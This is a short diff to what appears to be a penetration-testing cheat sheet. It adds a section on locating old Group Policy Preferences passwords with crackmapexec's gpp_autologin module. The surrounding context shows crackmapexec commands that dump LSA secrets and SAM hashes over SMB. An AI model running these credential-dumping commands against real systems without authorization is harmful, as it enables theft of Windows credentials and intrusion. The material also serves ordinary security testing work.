@@ -74,3 +74,9 @@ $ crackmapexec smb [ip] --local-auth -u [user] -p [pass] --lsa
 
 $ crackmapexec smb [ip] --local-auth -u [user] -p [pass] --sam
 ```
+
+### Locating old GPP Passwords
+GPP was patched in 2014 but some systems may still have old files lying around
+```bash
+crackmapexec smb [ip] -u [user] -p [pass] -M gpp_autologin
+```
